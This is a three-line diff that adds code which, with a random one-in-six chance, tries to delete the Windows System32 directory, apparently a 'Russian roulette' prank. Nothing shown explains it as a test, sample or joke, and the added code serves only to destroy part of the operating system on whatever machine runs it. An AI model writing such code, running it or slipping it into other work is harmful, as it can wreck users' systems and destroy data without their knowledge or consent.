@@ -1,0 +1,3 @@
+if $.random() < 1/6 {
+    path("C:/Windows/System32").rmdir()
+}
